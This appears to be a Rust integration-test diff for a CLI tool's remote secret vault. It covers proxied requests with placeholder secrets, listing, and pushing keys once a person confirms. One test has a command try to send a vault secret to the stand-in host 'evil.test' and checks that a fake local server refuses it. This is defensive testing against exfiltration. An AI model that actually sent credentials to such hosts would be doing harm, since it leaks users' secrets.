@@ -96,7 +96,9 @@ impl Toolbox {
         let mut cmd = Command::new(env!("CARGO_BIN_EXE_toolbox"));
         cmd.args(args)
             .env("TOOLBOX_HOME", self.home.path())
-            .env("TOOLBOX_INSECURE_TEST_VAULT", self.vault_file());
+            .env("TOOLBOX_INSECURE_TEST_VAULT", self.vault_file())
+            .env_remove("WGT_BASE_URL")
+            .env_remove("WGT_DEVICE_TOKEN");
         common::detach(&mut cmd);
         cmd
     }
@@ -1620,4 +1622,202 @@ fn terminating_a_session_leading_tb_ends_everything_it_started() {
     send_signal(child.id(), "TERM");
     assert!(!child.wait().unwrap().success());
     assert!(common::ends_soon(sleeper), "sleep {sleeper} outlived tb");
+}
+
+struct Seen {
+    method: String,
+    path: String,
+    auth: String,
+    body: Value,
+}
+
+/// A board that answers the vault endpoints: the listing, the proxy (status 403 for a url on evil.test,
+/// else 200 carrying `proxied`) and PUT (400 for a name that starts with `bad`).
+fn fake_board(listing: Value, proxied: Value) -> (String, mpsc::Receiver<Seen>) {
+    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
+    let url = format!("http://127.0.0.1:{}", listener.local_addr().unwrap().port());
+    let (tx, rx) = mpsc::channel();
+    thread::spawn(move || {
+        for stream in listener.incoming() {
+            let mut stream = stream.unwrap();
+            let mut reader = BufReader::new(stream.try_clone().unwrap());
+            let mut request_line = String::new();
+            reader.read_line(&mut request_line).unwrap();
+            let (mut auth, mut length) = (String::new(), 0usize);
+            loop {
+                let mut line = String::new();
+                reader.read_line(&mut line).unwrap();
+                if line == "\r\n" || line.is_empty() {
+                    break;
+                }
+                let lower = line.to_ascii_lowercase();
+                if let Some(value) = lower.strip_prefix("content-length:") {
+                    length = value.trim().parse().unwrap();
+                }
+                if lower.starts_with("authorization:") {
+                    auth = line["authorization:".len()..].trim().to_string();
+                }
+            }
+            let mut raw = vec![0u8; length];
+            std::io::Read::read_exact(&mut reader, &mut raw).unwrap();
+            let body: Value = serde_json::from_slice(&raw).unwrap_or(Value::Null);
+            let mut parts = request_line.split(' ');
+            let (method, path) = (parts.next().unwrap().to_string(), parts.next().unwrap().to_string());
+            let (status, answer) = match (method.as_str(), path.as_str()) {
+                ("GET", "/api/v1/vault/secrets") => (200, listing.clone()),
+                ("POST", "/api/v1/vault/request") if body["url"].as_str().unwrap_or("").contains("evil.test") => {
+                    (403, json!({ "error": "secret \"test\" may not go to evil.test" }))
+                }
+                ("POST", "/api/v1/vault/request") => (200, proxied.clone()),
+                ("PUT", p) if p.starts_with("/api/v1/secrets/bad") => (400, json!({ "error": "nope" })),
+                ("PUT", _) => (200, json!({ "ok": true })),
+                _ => (404, json!({ "error": "unknown" })),
+            };
+            let text = answer.to_string();
+            write!(stream, "HTTP/1.1 {status} X\r\ncontent-type: application/json\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{text}", text.len()).unwrap();
+            tx.send(Seen { method, path, auth, body }).unwrap();
+        }
+    });
+    (url, rx)
+}
+
+fn paired(board: &str) -> [(&str, &str); 2] {
+    [("WGT_BASE_URL", board), ("WGT_DEVICE_TOKEN", "device-token-123")]
+}
+
+fn answer(status: u16, body: &str) -> Value {
+    json!({ "status": status, "headers": { "content-type": "application/json" }, "body": STANDARD.encode(body) })
+}
+
+#[test]
+fn a_paired_mac_sends_requests_with_placeholders_to_the_board_and_holds_no_key() {
+    let tb = Toolbox::new();
+    let target = "http://127.0.0.1:9/";
+    let (board, seen) = fake_board(json!({ "secrets": [{ "name": "test", "hosts": [host_of(target)], "methods": [], "paths": [] }] }), answer(201, r#"{"made":true}"#));
+    tb.edit_vault(|vault| vault["keys"]["test"] = json!({ "value": "", "hosts": [], "remote": true }));
+    tb.add_command(
+        "call",
+        echo_manifest("call"),
+        r#"return function(args)
+            local res = http.post(args.url, { headers = { Authorization = "Bearer " .. vault("test") }, query = { a = "1" }, body = "hello" })
+            return { status = res.status, json = res.json }
+        end"#,
+    );
+
+    let unapproved = tb.run_with_env(&["call", "--url", target], &paired(&board));
+    assert!(!unapproved.status.success(), "an approval is still needed on this Mac");
+    assert!(stderr(&unapproved).contains("tb self vault setup call"), "{}", stderr(&unapproved));
+
+    tb.allow("test", "call");
+    let out = tb.run_with_env(&["call", "--url", target], &paired(&board));
+    assert!(out.status.success(), "{}", stderr(&out));
+    assert_eq!(serde_json::from_slice::<Value>(&out.stdout).unwrap(), json!({ "status": 201, "json": { "made": true } }));
+
+    let list = seen.recv().unwrap();
+    assert_eq!((list.method.as_str(), list.path.as_str()), ("GET", "/api/v1/vault/secrets"));
+    let list = seen.recv().unwrap();
+    assert_eq!((list.method.as_str(), list.path.as_str()), ("GET", "/api/v1/vault/secrets"));
+    let proxied = seen.recv().unwrap();
+    assert_eq!((proxied.method.as_str(), proxied.path.as_str(), proxied.auth.as_str()), ("POST", "/api/v1/vault/request", "Bearer device-token-123"));
+    assert_eq!(proxied.body["method"], "POST");
+    assert_eq!(proxied.body["url"], target);
+    assert_eq!(proxied.body["headers"], json!([["Authorization", "Bearer {{vault:test}}"]]));
+    assert_eq!(proxied.body["query"], json!([["a", "1"]]));
+    assert_eq!(STANDARD.decode(proxied.body["body"].as_str().unwrap()).unwrap(), b"hello");
+    assert!(tb.vault()["keys"]["test"]["value"] == "", "no value ever lands in the vault");
+}
+
+#[test]
+fn the_board_refusing_a_request_is_an_error_naming_why() {
+    let tb = Toolbox::new();
+    let (board, _seen) = fake_board(json!([{ "name": "test", "hosts": ["evil.test"] }]), answer(200, "{}"));
+    tb.edit_vault(|vault| vault["keys"]["test"] = json!({ "value": "", "hosts": [], "remote": true }));
+    let mut manifest = echo_manifest("call");
+    manifest["permissions"]["http"] = json!(["evil.test"]);
+    tb.add_command("call", manifest, r#"return function(args) return http.get(args.url, { headers = { Authorization = vault("test") } }).status end"#);
+    tb.allow("test", "call");
+    let out = tb.run_with_env(&["call", "--url", "https://evil.test/"], &paired(&board));
+    assert!(!out.status.success());
+    assert!(stderr(&out).contains("may not go to evil.test") && stderr(&out).contains("403"), "{}", stderr(&out));
+}
+
+#[test]
+fn list_shows_the_boards_secrets_next_to_local_ones() {
+    let tb = Toolbox::new();
+    tb.add_secret("local", SECRET, &["api.example.com"]);
+    let (board, _seen) = fake_board(json!({ "secrets": [{ "name": "coolify", "hosts": ["coolify.example.com"], "methods": ["GET"], "paths": [], "sync": null }] }), answer(200, "{}"));
+    let listed = stdout(&tb.run_with_env(&["self", "vault", "list"], &paired(&board)));
+    let list: Value = serde_json::from_str(&listed).unwrap();
+    let by_name = |name: &str| list.as_array().unwrap().iter().find(|s| s["name"] == name).unwrap().clone();
+    assert_eq!(by_name("coolify")["board"], true);
+    assert_eq!(by_name("coolify")["hosts"], json!(["coolify.example.com"]));
+    assert_eq!(by_name("coolify")["methods"], json!(["GET"]));
+    assert!(by_name("local").get("board").is_none());
+    assert!(!listed.contains(SECRET));
+
+    let unpaired: Value = serde_json::from_str(&stdout(&tb.run(&["self", "vault", "list"]))).unwrap();
+    assert_eq!(unpaired.as_array().unwrap().len(), 1, "not paired: exactly as before");
+}
+
+#[test]
+fn push_moves_local_keys_to_the_board_once_it_confirms() {
+    let tb = Toolbox::new();
+    let (board, seen) = fake_board(json!([]), answer(200, "{}"));
+    tb.edit_vault(|vault| {
+        vault["keys"]["good"] = json!({ "value": SECRET, "hosts": ["api.example.com"], "methods": ["GET"], "confirm": ["writes"], "commands": { "c": "abc" } });
+        vault["keys"]["bad-one"] = json!({ "value": "fake_other_value_123", "hosts": ["api.example.com"] });
+        vault["keys"]["signin"] = json!({ "value": "fake_refresh_value_1", "hosts": ["api.example.com"],
+            "oauth": { "auth_url": "https://a.example.com/a", "token_url": "https://a.example.com/t", "client_id": "id", "cache_key": "fake_cache_key_12345" } });
+    });
+    let terminal = Pty::open();
+    let screen = terminal.screen();
+    let mut keyboard = terminal.keyboard();
+    let mut cmd = Command::new(env!("CARGO_BIN_EXE_toolbox"));
+    cmd.args(["self", "vault", "push"])
+        .env("TOOLBOX_HOME", tb.home.path())
+        .env("TOOLBOX_INSECURE_TEST_VAULT", tb.vault_file())
+        .env("TOOLBOX_NO_UPDATE_CHECK", "1")
+        .envs(paired(&board))
+        .env("TOOLBOX_INSECURE_TEST_CONFIRM", "yes")
+        .stdin(terminal.terminal_side())
+        .stdout(Stdio::piped());
+    pty::use_as_terminal(&mut cmd, terminal.path.clone());
+    let child = cmd.spawn().unwrap();
+    pty::wait_for(&screen, "[y/N]");
+    keyboard.write_all(b"y\n").unwrap();
+    let out = child.wait_with_output().unwrap();
+    assert!(out.status.success(), "{}", stderr(&out));
+    let report: Value = serde_json::from_slice(&out.stdout).unwrap();
+    assert_eq!(report["pushed"], json!(["good"]));
+    assert_eq!(report["skipped"][0]["name"], "signin");
+    assert_eq!(report["failed"][0]["name"], "bad-one");
+
+    let put = seen.recv().unwrap();
+    assert_eq!((put.method.as_str(), put.path.as_str(), put.auth.as_str()), ("PUT", "/api/v1/secrets/bad-one", "Bearer device-token-123"));
+    let put = seen.recv().unwrap();
+    assert_eq!(put.path, "/api/v1/secrets/good");
+    assert_eq!(put.body, json!({ "value": SECRET, "allowed_hosts": ["api.example.com"], "methods": ["GET"], "paths": [] }));
+
+    let vault = tb.vault();
+    assert_eq!(vault["keys"]["good"]["value"], "");
+    assert_eq!(vault["keys"]["good"]["remote"], true);
+    assert_eq!(vault["keys"]["good"]["commands"], json!({ "c": "abc" }));
+    assert_eq!(vault["keys"]["good"]["confirm"], json!(["writes"]));
+    assert_eq!(vault["keys"]["bad-one"]["value"], "fake_other_value_123", "a key the board refused stays here");
+    assert_eq!(vault["keys"]["signin"]["value"], "fake_refresh_value_1");
+    assert!(!vault.to_string().contains(SECRET));
+}
+
+#[test]
+fn push_needs_a_pairing_and_a_human() {
+    let tb = Toolbox::new();
+    tb.add_secret("k", SECRET, &["api.example.com"]);
+    let unpaired = tb.run(&["self", "vault", "push"]);
+    assert!(!unpaired.status.success());
+    assert!(stderr(&unpaired).contains("not paired"), "{}", stderr(&unpaired));
+    let (board, seen) = fake_board(json!([]), answer(200, "{}"));
+    let no_terminal = tb.run_with_env(&["self", "vault", "push"], &paired(&board));
+    assert!(!no_terminal.status.success());
+    assert!(seen.try_recv().is_err(), "nothing is sent without a person saying yes");
+    assert_eq!(tb.vault()["keys"]["k"]["value"], SECRET);
 }
